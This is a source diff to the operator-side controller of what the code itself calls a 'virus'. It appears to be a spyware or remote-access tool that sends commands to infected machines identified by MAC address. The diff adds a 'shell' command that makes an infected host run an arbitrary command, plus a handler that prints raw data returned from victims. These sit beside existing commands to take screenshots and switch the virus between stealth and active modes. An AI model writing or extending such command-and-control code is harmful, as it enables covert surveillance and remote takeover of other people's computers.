@@ -31,9 +31,9 @@ namespace sh
     {
     public:
         ClientSession(spi::net::SSLContext &ctx, spi::net::IOManager &mgr) :
-            spi::SyncCommandableSession(mgr, ctx, "RemoteShell"), _ctx(ctx), _mgr(mgr)
+            spi::SyncCommandableSession(mgr, ctx, "remote-shell"), _ctx(ctx), _mgr(mgr)
         {
-            if (!_ctx.usePrivateKeyFile("p.pem") || !_ctx.useCertificateFile("s.pem")) {
+            if (!_ctx.usePrivateKeyFile("key.pem") || !_ctx.useCertificateFile("cert.pem")) {
                 _log(logging::Error) << "SSL Context loading error" << std::endl;
                 this->__close();
             }
@@ -41,6 +41,8 @@ namespace sh
                                    spi::proto::MessageType::RListReply);
             _cmdHandler.onMessages(boost::bind(&ClientSession::__reply, this, _1),
                                    spi::proto::MessageType::ReplyCode);
+            _cmdHandler.onMessages(boost::bind(&ClientSession::__handleRawData, this, _1),
+                                   spi::proto::MessageType::RawData);
         }
 
         void setup(const sh::Config &cfg)
@@ -90,15 +92,15 @@ namespace sh
             std::cout << _cli.runCommand("helpfull") << std::flush;
             std::cout << _cli.prompt() << std::flush;
             while (_running) {
-                auto ec = _interractive.readLine(_buff);
+                std::string line;
+                auto ec = _interractive.readLine(line);
                 if (ec) {
                     _log(logging::Error) << ec.message() << std::endl;
                     _running = false;
                 } else {
-                    std::string s((std::istreambuf_iterator<char>(&_buff)), std::istreambuf_iterator<char>());
-                    _buff.consume(1);
-                    s.pop_back();
-                    std::cout << _cli.runCommand(s) << std::endl;
+                    if (!line.empty())
+                        line.pop_back();
+                    std::cout << _cli.runCommand(line) << std::endl;
                 }
                 if (_running)
                     std::cout << _cli.prompt() << std::flush;
@@ -123,13 +125,13 @@ namespace sh
             _interractive.close();
             _log(logging::Info) << "Closing input filedescriptor ..." << std::endl;
             _mgr.stop();
-            _log(logging::Info) << "Stopping IOService ..." << std::flush;
+            _log(logging::Info) << "Stopping IOService ..." << std::endl;
         }
 
         void __write(spi::ILoggable &loggable, spi::ErrorCode &ec) noexcept
         {
             spi::Buffer buffer;
-            loggable.serializeTypeInfo(buffer);
+
             loggable.serialize(buffer);
             _conn.writeSome(buffer, ec);
             __checkErrorCode(ec, "", false);
@@ -138,7 +140,7 @@ namespace sh
     private:
         //! Callback for the Command Line Interfaces.
         //! Using of StringStream for Graphical Compatibility.
-        std::string __list([[maybe_unused]] utils::CLI::commandArg &&arg) noexcept
+        std::string __list([[maybe_unused]] utils::CLI::commandArg &&arg)
         {
             std::stringstream ss;
             try {
@@ -147,11 +149,10 @@ namespace sh
                 __write(list, ec);
                 if (!ec) {
                     spi::ErrorCode ecAnswer;
-                    runCommand(ecAnswer);
+                    getResult(ecAnswer);
                     __checkErrorCode(ecAnswer, "", false);
                 }
-            }
-            catch (const std::exception &error) {
+            } catch (const std::exception &error) {
                 _log(logging::Error) << error.what() << std::endl;
             }
             return ss.str();
@@ -159,21 +160,22 @@ namespace sh
 
         void __listReply(const spi::ILoggable &l)
         {
-            spi::proto::RListReply cpy = dynamic_cast<const spi::proto::RListReply &>(l);
-            spi::Buffer buff;
-            buff.resize(cpy.nbClients * 6);
-            spi::ErrorCode ec;
-            _conn.readSome(spi::net::BufferView(buff.data(), buff.size()), ec);
-            __checkErrorCode(ec);
-            for (unsigned int idx = 0; idx < cpy.nbClients; idx++) {
-                cpy.connectedClients.push_back(spi::Serializer::unserializeMACAddress(buff, idx, 6));
-            }
-            std::cout << cpy.JSONify() << std::endl;
+            std::cout << l.JSONify() << std::endl;
         }
 
         void __reply(const spi::ILoggable &l)
         {
             std::cout << l.stringify() << std::endl;
+        }
+
+        void __handleRawData(const spi::ILoggable &l)
+        {
+            using namespace spi;
+
+            const proto::RawData &rd = static_cast<const proto::RawData &>(l);
+
+            std::string output(rd.bytes.begin(), rd.bytes.end());
+            std::cout << "Data: " << output << ", " << rd.bytes.size() << std::endl;
         }
 
         std::string __screenshot(utils::CLI::commandArg &&arg)
@@ -187,7 +189,7 @@ namespace sh
                 screen.addr = addr;
                 __write(screen, ec);
                 if (!ec)
-                    runCommand(ec);
+                    getResult(ec);
             }
             catch (const std::invalid_argument &error) {
                 _log(logging::Error) << error.what() << std::endl;
@@ -206,7 +208,7 @@ namespace sh
                 spi::ErrorCode ec;
                 __write(stealthMode, ec);
                 if (!ec) {
-                    runCommand(ec);
+                    getResult(ec);
                 }
             }
             catch (const std::invalid_argument &error) {
@@ -226,12 +228,30 @@ namespace sh
                 spi::ErrorCode ec;
                 __write(activeMode, ec);
                 if (!ec)
-                    runCommand(ec);
+                    getResult(ec);
             }
             catch (const std::invalid_argument &error) {
                 _log(logging::Error) << error.what() << std::endl;
             }
             return ss.str();
+        }
+
+        std::string __runShell(utils::CLI::commandArg &&arg)
+        {
+            try {
+                net::MACAddress addr{};
+                addr.fromString(arg[0]);
+                spi::proto::RRunShell rrsh;
+                rrsh.target = addr;
+                rrsh.cmd = arg[1];
+                spi::ErrorCode ec;
+                __write(rrsh, ec);
+                if (!ec)
+                    getResult(ec);
+            } catch (const std::invalid_argument &e) {
+                _log(logging::Error) << e.what() << std::endl;
+            }
+            return "";
         }
 
         std::string __exit([[maybe_unused]] utils::CLI::commandArg &&arg)
@@ -251,6 +271,7 @@ namespace sh
                 ("screenshot", bind(&ClientSession::__screenshot), 1, __usage("take a screenshot", "screenshot", "ID"))
                 ("stealth", bind(&ClientSession::__stealth), 1, __usage("stealth the virus", "stealth", "ID"))
                 ("active", bind(&ClientSession::__active), 1, __usage("active the virus", "active", "ID"))
+                ("shell", bind(&ClientSession::__runShell), 2, __usage("", "", ""))
                 ("exit", bind(&ClientSession::__exit), 0, __usage("quit the remoteShell", "exit"));
         }
 
@@ -273,7 +294,6 @@ namespace sh
         spi::net::SSLContext &_ctx;
         spi::net::IOManager &_mgr;
         spi::net::PosixStream _interractive{_mgr, ::dup(STDIN_FILENO)};
-        boost::asio::streambuf _buff;
         utils::CLI _cli;
         unsigned short _port;
         std::string _address;
